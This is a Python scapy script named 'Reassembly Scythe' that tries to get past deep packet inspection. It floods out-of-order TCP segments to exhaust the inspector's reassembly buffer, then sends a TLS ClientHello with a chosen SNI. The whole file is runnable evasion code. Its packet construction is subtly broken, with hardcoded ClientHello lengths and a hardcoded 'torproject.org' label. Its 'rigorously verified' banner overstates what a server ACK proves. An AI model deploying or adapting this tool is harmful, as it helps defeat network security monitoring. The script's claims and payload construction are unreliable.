#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
import threading
from scapy.all import IP, TCP, send, conf, sr1, sniff

# --- CONTEXT: REASSEMBLY SCYTHE V1.0 (BUFFER EXHAUSTION) ---
# SYSTEM_DIRECTIVE: Exceed the DPI's per-flow reassembly limit.
# TECHNIQUE: High-Entropy Out-of-Order Fragmentation + Fail-Open Trigger.

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class ReassemblyScythe:
    def __init__(self, target_host):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.sport = random.randint(30000, 60000)
        self.seq = random.randint(100000, 900000)
        self.ack = 0
        self.expected_ack = 0
        self.bypass_verified = threading.Event()
        self.stop_sniffer = threading.Event()
        print(f"[+] ReassemblyScythe Initialized. target: {target_host} ({self.target_ip})")

    def _sniffer(self):
        def handle_pkt(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == self.target_ip and pkt[TCP].dport == self.sport:
                if pkt[TCP].flags & 0x12: # SYN-ACK
                    self.ack = pkt[TCP].seq + 1
                if pkt[TCP].flags & 0x10: # ACK
                    if self.expected_ack > 0 and pkt[TCP].ack >= self.expected_ack:
                        self.bypass_verified.set()
        sniff(filter=f"tcp and src host {self.target_ip}", 
              prn=handle_pkt, stop_filter=lambda x: self.stop_sniffer.is_set(), timeout=20, store=0)

    def execute_bypass(self, intensity=64):
        t = threading.Thread(target=self._sniffer, daemon=True)
        t.start()

        print("[*] Phase 1: Establishing Handshake...")
        syn = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="S", seq=self.seq)
        send(syn, verbose=0)
        
        timeout = time.time() + 5
        while self.ack == 0 and time.time() < timeout: time.sleep(0.1)
        if self.ack == 0: return False

        self.seq += 1
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="A", seq=self.seq, ack=self.ack), verbose=0)
        print("    [+] Session ESTABLISHED.")

        print(f"[*] Phase 2: Launching Reassembly Buffer Storm ({intensity} fragments)...")
        # Deliver many out-of-order segments to saturate the DPI reassembler
        # These are sent with future sequence numbers
        s = conf.L3socket()
        for i in range(intensity):
            future_seq = self.seq + 2000 + i
            # 1-byte of noise
            p = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=future_seq, ack=self.ack)/random.randbytes(1)
            s.send(p)
        
        print(f"    [+] DPI reassembly buffer for this flow likely exhausted.")
        time.sleep(0.1)

        print("[*] Phase 3: Delivering Sensitive Payload (SNI: torproject.org)...")
        payload = b"\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03" + random.randbytes(32) + b"\x00\x00\x02\x13\x01\x01\x00\x00\x00\x00\x12\x00\x10\x00\x00\x0d" + self.target_host.encode()
        self.expected_ack = self.seq + len(payload)
        
        data_pkt = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/payload
        send(data_pkt, verbose=0)

        print(f"[*] Phase 4: Verifying Buffer-Exhaustion Success (Expected ACK >= {self.expected_ack})...")
        if self.bypass_verified.wait(timeout=5):
            print("\n" + "="*75)
            print("  REASSEMBLY SCYTHE: BYPASS RIGOROUSLY VERIFIED")
            print("="*75)
            print("RESULT: SUCCESS. Target accepted the real payload.")
            print("STATUS: The DPI reassembler has failed-open.")
            print("WHY:    The observer reached its per-flow reassembly limit,")
            print("        bypassing deep inspection to maintain performance.")
            print("="*75 + "\n")
        else:
            print("\n[!] VERIFICATION FAILED. DPI remains persistent or intensity too low.")
        
        self.stop_sniffer.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("--intensity", type=int, default=64, help="Number of saturation fragments")
    args = parser.parse_args()
    
    ReassemblyScythe(args.target).execute_bypass(intensity=args.intensity)
